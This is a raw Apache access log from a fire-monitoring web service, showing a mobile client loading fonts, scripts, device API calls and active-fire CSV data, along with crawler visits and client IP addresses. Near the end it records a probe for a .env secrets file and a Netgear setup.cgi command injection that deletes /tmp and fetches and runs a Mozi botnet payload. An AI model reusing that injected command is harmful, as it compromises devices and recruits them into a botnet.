fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:22 +0000] "GET /static/media/roboto-latin-100italic.f9e8e590.woff?__WB_REVISION__=f9e8e590b4e0f1ff83469bb2a55b8488 HTTP/1.1" 200 22069 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:22 +0000] "GET /static/media/roboto-latin-300.b00849e0.woff?__WB_REVISION__=b00849e00f4c2331cddd8ffb44a6720b HTTP/1.1" 200 20713 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:22 +0000] "GET /static/media/roboto-latin-300.ef7c6637.woff2?__WB_REVISION__=ef7c6637c68f269a882e73bcb57a7f6a HTTP/1.1" 200 16090 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:22 +0000] "GET /static/media/roboto-latin-300italic.14286f3b.woff2?__WB_REVISION__=14286f3ba79c6627433572dfa925202e HTTP/1.1" 200 17776 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:23 +0000] "GET /static/media/roboto-latin-300italic.4df32891.woff?__WB_REVISION__=4df32891a5f2f98a363314f595482e08 HTTP/1.1" 200 22569 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:23 +0000] "GET /static/media/roboto-latin-400.479970ff.woff2?__WB_REVISION__=479970ffb74f2117317f9d24d9e317fe HTTP/1.1" 200 16042 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:23 +0000] "GET /static/media/roboto-latin-400.60fa3c06.woff?__WB_REVISION__=60fa3c0614b8fb2f394fa29944c21540 HTTP/1.1" 200 20633 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:23 +0000] "GET /static/media/roboto-latin-400italic.51521a2a.woff2?__WB_REVISION__=51521a2a8da71e50d871ac6fd2187e87 HTTP/1.1" 200 17652 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:23 +0000] "GET /static/media/roboto-latin-400italic.fe65b833.woff?__WB_REVISION__=fe65b8335ee19dd944289f9ed3178c78 HTTP/1.1" 200 22317 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:23 +0000] "GET /static/media/roboto-latin-500.020c97dc.woff2?__WB_REVISION__=020c97dc8e0463259c2f9df929bb0c69 HTTP/1.1" 200 16178 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:23 +0000] "GET /static/media/roboto-latin-500.87284894.woff?__WB_REVISION__=87284894879f5b1c229cb49c8ff6decc HTTP/1.1" 200 20829 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:23 +0000] "GET /static/media/roboto-latin-500italic.288ad9c6.woff?__WB_REVISION__=288ad9c6e8b43cf02443a1f499bdf67e HTTP/1.1" 200 22385 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:23 +0000] "GET /static/media/roboto-latin-500italic.db4a2a23.woff2?__WB_REVISION__=db4a2a231f52e497c0191e8966b0ee58 HTTP/1.1" 200 17644 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:23 +0000] "GET /static/media/roboto-latin-700.2735a3a6.woff2?__WB_REVISION__=2735a3a69b509faf3577afd25bdf552e HTTP/1.1" 200 16122 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:23 +0000] "GET /static/media/roboto-latin-700.adcde98f.woff?__WB_REVISION__=adcde98f1d584de52060ad7b16373da3 HTTP/1.1" 200 20721 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:23 +0000] "GET /static/media/roboto-latin-700italic.81f57861.woff?__WB_REVISION__=81f57861ed4ac74741f5671e1dff2fd9 HTTP/1.1" 200 21953 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:23 +0000] "GET /static/media/roboto-latin-700italic.da0e7178.woff2?__WB_REVISION__=da0e717829e033a69dec97f1e155ae42 HTTP/1.1" 200 17348 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:22 +0000] "GET /static/js/main.e3865b27.chunk.js?__WB_REVISION__=878c525cbd4f8972ffe0 HTTP/1.1" 200 229702 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:24 +0000] "GET /static/media/roboto-latin-900.9b3766ef.woff2?__WB_REVISION__=9b3766ef4a402ad3fdeef7501a456512 HTTP/1.1" 200 16018 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:24 +0000] "GET /static/media/roboto-latin-900.bb1e4dc6.woff?__WB_REVISION__=bb1e4dc6333675d11ada2e857e7f95d7 HTTP/1.1" 200 20757 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:24 +0000] "GET /static/media/roboto-latin-900italic.28f91510.woff?__WB_REVISION__=28f9151055c950874d2c6803a39b425b HTTP/1.1" 200 22669 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:24 +0000] "GET /static/media/roboto-latin-900italic.ebf6d164.woff2?__WB_REVISION__=ebf6d1640ccddb99fb49f73c052c55a8 HTTP/1.1" 200 17848 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:24 +0000] "GET /images/icon/moto_orange.png HTTP/1.1" 200 1656 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:24 +0000] "GET /images/icon/plane_orange.png HTTP/1.1" 200 1639 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:24 +0000] "GET /images/icon/truck_orange.png HTTP/1.1" 200 1650 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:24 +0000] "GET /images/marker_home.png HTTP/1.1" 200 5414 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:22 +0000] "GET /static/js/2.f5306527.chunk.js?__WB_REVISION__=d5b7bfa0cda60a5bc819 HTTP/1.1" 200 562786 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:25 +0000] "GET /images/marker.png HTTP/1.1" 200 2839 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:26 +0000] "POST /api/session HTTP/1.1" 200 855 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:26 +0000] "GET /api/devices HTTP/1.1" 200 681 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:27 +0000] "GET /windy.js HTTP/1.1" 200 997 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:80 186.12.96.148 - - [01/Dec/2020:10:57:27 +0000] "-" 408 0 "-" "-"
fenix.geolynx.com.ar:80 ::1 - - [01/Dec/2020:10:57:30 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
fenix.geolynx.com.ar:80 ::1 - - [01/Dec/2020:10:57:32 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
fenix.geolynx.com.ar:80 ::1 - - [01/Dec/2020:10:57:34 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:35 +0000] "GET /api/devices HTTP/1.1" 200 1225 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:39 +0000] "GET /api/devices/33 HTTP/1.1" 200 679 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:52 +0000] "PUT /api/devices/33 HTTP/1.1" 200 1249 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:58:12 +0000] "-" 408 543 "-" "-"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:57:28 +0000] "GET /api/socket HTTP/1.1" 200 1111 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:58:31 +0000] "GET /api/server HTTP/1.1" 200 1263 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:58:31 +0000] "GET /api/session HTTP/1.1" 200 1372 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:58:31 +0000] "GET /favicon.png HTTP/1.1" 200 24853 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:58:31 +0000] "GET /favicon.ico HTTP/1.1" 404 521 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:58:32 +0000] "GET /api/devices HTTP/1.1" 200 680 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:58:38 +0000] "GET /service-worker.js HTTP/1.1" 200 1600 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:59:51 +0000] "-" 408 543 "-" "-"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:59:52 +0000] "-" 408 543 "-" "-"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:11:00:52 +0000] "-" 408 543 "-" "-"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:11:00:52 +0000] "-" 408 543 "-" "-"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:11:01:52 +0000] "-" 408 543 "-" "-"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:11:01:52 +0000] "-" 408 543 "-" "-"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:11:02:12 +0000] "GET /data/active_fire/c6/csv/MODIS_C6_South_America_24h.csv HTTP/1.1" 200 54202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:11:02:12 +0000] "GET /data/active_fire/noaa-20-viirs-c2/csv/J1_VIIRS_C2_South_America_24h.csv HTTP/1.1" 200 406889 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:11:02:12 +0000] "GET /data/active_fire/suomi-npp-viirs-c2/csv/SUOMI_VIIRS_C2_South_America_24h.csv HTTP/1.1" 200 352469 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:11:02:52 +0000] "-" 408 543 "-" "-"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:11:02:52 +0000] "-" 408 543 "-" "-"
fenix.geolynx.com.ar:443 186.12.96.148 - - [01/Dec/2020:10:58:33 +0000] "GET /api/socket HTTP/1.1" 200 1111 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
fenix.geolynx.com.ar:80 ::1 - - [01/Dec/2020:11:03:04 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
geolynx.com.ar:80 66.249.66.82 - - [01/Dec/2020:11:10:43 +0000] "GET /robots.txt HTTP/1.1" 302 559 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
geolynx.com.ar:443 66.249.66.86 - - [01/Dec/2020:11:10:43 +0000] "GET /robots.txt HTTP/1.1" 404 4173 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
geolynx.com.ar:80 66.249.66.82 - - [01/Dec/2020:11:10:43 +0000] "GET / HTTP/1.1" 302 538 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
geolynx.com.ar:443 66.249.66.86 - - [01/Dec/2020:11:10:44 +0000] "GET / HTTP/1.1" 200 3279 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
geolynx.com.ar:80 54.36.148.34 - - [01/Dec/2020:11:12:02 +0000] "GET / HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
fenix.geolynx.com.ar:80 195.206.104.235 - - [01/Dec/2020:11:19:05 +0000] "GET /.env HTTP/1.1" 302 499 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
fenix.geolynx.com.ar:80 195.206.104.235 - - [01/Dec/2020:11:19:06 +0000] "POST / HTTP/1.1" 302 491 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
fenix.geolynx.com.ar:443 139.162.113.204 - - [01/Dec/2020:11:53:12 +0000] "GET / HTTP/1.1" 200 6513 "-" "HTTP Banner Detection (https://security.ipip.net)"
fenix.geolynx.com.ar:443 183.136.225.56 - - [01/Dec/2020:12:02:36 +0000] "GET / HTTP/1.1" 200 7267 "-" "Baiduspider+(+http://www.baidu.com/search/spider.htm);googlebot|baiduspider|baidu|spider|sogou|bingbot|bot|yahoo|soso|sosospider|360spider|youdaobot|jikeSpider;)"
fenix.geolynx.com.ar:80 188.169.64.88 - - [01/Dec/2020:12:35:47 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 842 "-" "-"
